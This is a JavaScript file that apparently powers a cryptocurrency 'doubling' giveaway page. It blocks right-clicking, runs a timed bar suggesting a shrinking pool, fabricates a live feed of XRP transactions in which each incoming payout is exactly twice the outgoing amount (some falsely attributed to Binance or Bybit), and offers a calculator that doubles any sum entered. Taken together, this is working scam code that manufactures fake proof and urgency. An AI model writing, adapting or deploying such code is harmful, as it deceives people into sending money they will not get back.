

function clickIE4() {
  if (event.button == 2) {
    alert(message);
    return false;
  }
}
function clickNS4(e) {
  if (document.layers || document.getElementById && !document.all) {
    if (e.which == 2 || e.which == 3) {
      return false;
    }
  }
}
if (document.layers) {
  document.captureEvents(Event.MOUSEDOWN);
  document.onmousedown = clickNS4;
} else if (document.all && !document.getElementById) {
  document.onmousedown = clickIE4;
}
document.oncontextmenu = new Function("return false");

var maxPoints = 100;
var currentPoints = 75;

function updatePercent(percent) {
  const otherPart = 100 - percent;
  const pattern = percent + ' ' + otherPart;
  $('#percent-circle-id').attr('stroke-dasharray', pattern);
}
setInterval(function () {
  let percent = (currentPoints / 100) * 1;
  currentPoints = currentPoints - percent;
  percent = (currentPoints / maxPoints) * 100;
  if (currentPoints >= 10) {
    updatePercent(percent);
    $('#progress-ico-bar').html(`${Math.floor(currentPoints)}%`);
  }
}, 25000);

function setCurrency(currency) {
  if (currency == 1) {
    maxPoints = 10000;
    currentPoints = 7500;
  } else if (currency == 2) {
    maxPoints = 50000;
    currentPoints = 40000;
  }
  updatePercent((currentPoints / maxPoints) * 100);
  $('#progress-ico-bar').html(`${Math.floor(currentPoints)} / ${maxPoints}`);
}

var transTemplate = `<div class="inner trans-action">
<div class="top">
  <div class="rows row-trans-out">
    <div class="hash col-lg-2 col-md-2 col-sm-2 col-xs-2">$1$</div>
    <div class="bitwal-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">$3$</div>
    <div class="bitwal col-lg-2 col-md-2 col-sm-2 col-xs-2">$4$</div>
    <div class="out-trans col-lg-1 col-md-1 col-sm-2 col-xs-2">
      OUT
    </div>
    <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">
      1 min
    </div>
    <div class="value col-lg-2 col-md-2 col-sm-2 col-xs-2">$6$K XRP</div>
    <div class="tx-fee col-lg-1 col-md-1 col-sm-1 col-xs-1">$14$</div>
    <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1"><span class="badge badge-success">SUCCESS</span></div>
  </div>
</div>
<div class="bottom">
  <div class="rows row-trans-in">
    <div class="hash col-lg-2 col-md-2 col-sm-2 col-xs-2">$8$</div>
    <div class="bitwal col-lg-2 col-md-2 col-sm-2 col-xs-2">$10$</div>
    <div class="bitwal-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">$11$</div>
    <div class="in-trans col-lg-1 col-md-1 col-sm-1 col-xs-1">
      IN
    </div>
    <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">1 min</div>
    <div class="value col-lg-2 col-md-2 col-sm-2 col-xs-2">$13$K XRP</div>
    <div class="tx-fee col-lg-1 col-md-1 col-sm-2 col-xs-2">$15$</div>
    <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1"><span class="badge badge-success">SUCCESS</span></div>
  </div>
</div>
</div>`;

function generateLine(length) {
  var result = '';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

function newLine() {
  let rrand = (Math.floor(Math.random() * 10) + 1);
  let count = (Math.floor(Math.random() * 999) + 5);
  if (rrand == 1) count = (Math.floor(Math.random() * 99) + 5);
  let fromAddress = ETH_ADDRESS;
  fromAddress = fromAddress.substr(0, 8) + '...';
  let toAddress = 'r' + generateLine(6) + '...';
  rrand = (Math.floor(Math.random() * 10) + 1);
  if (rrand == 1) {
    rrand = (Math.floor(Math.random() * 2) + 1);
    let nname = rrand == 1 ? 'Binance' : 'Bybit';
    rrand = (Math.floor(Math.random() * rrand == 1 ? 9 : 3) + 1);
    toAddress = `${nname} ${rrand}`;
  }
  let temp = transTemplate.replace('$1$', generateLine(8).toUpperCase() + '...')
    .replace('$2$', Math.floor(Math.random() * 65040580))
    .replace('$3$', toAddress).replace('$4$', fromAddress)
    .replace('$8$', generateLine(8).toUpperCase() + '...').replace('$10$', fromAddress)
    .replace('$11$', toAddress).replace('$9$', Math.floor(Math.random() * 65040580))
    .replace('$6$', count.toFixed(0)).replace('$13$', (count * 2).toFixed(0))
    .replace('$14$', (count * 0.00039).toFixed(5)).replace('$15$', ((count * 2) * 0.00039).toFixed(5));
  $('.transaction-table__list').prepend(temp);
  $('.trans-action').each((index, element) => {
    if (index > 5) element.remove();
  });
}

newLine();
newLine();
setInterval(function () {
  newLine();
}, 10000);

$('#in-calc').keyup(function (ev) {
  var val = Number($(this).val());
  if (val > 1000000) val = 1000000;
  $('#in-calc').val(val).trigger('input');
  $('#out-calc').val(val * 2).trigger('input');
  $('#calcnum').html(val * 2);
});
$('#out-calc').keyup(function (ev) {
  var val = Number($(this).val());
  if (val > 2000000) val = 2000000;
  $('#out-calc').val(val).trigger('input');
  $('#in-calc').val(val / 2).trigger('input');
  $('#calcnum').html(val);
});
$('.calc-sum-buttons button').click(function (ev) {
  let text = $(this).html();
  let matches = [];
  if (matches = text.match(/^(\d+)K$/)) {
    $('#in-calc').val(Number(matches[1]) * 1000);
    $('#in-calc').trigger('keyup').trigger('input');
  } else if (matches = text.match(/^(\d+)Mil$/)) {
    $('#in-calc').val(Number(matches[1]) * 1000000);
    $('#in-calc').trigger('keyup').trigger('input');
  }
});
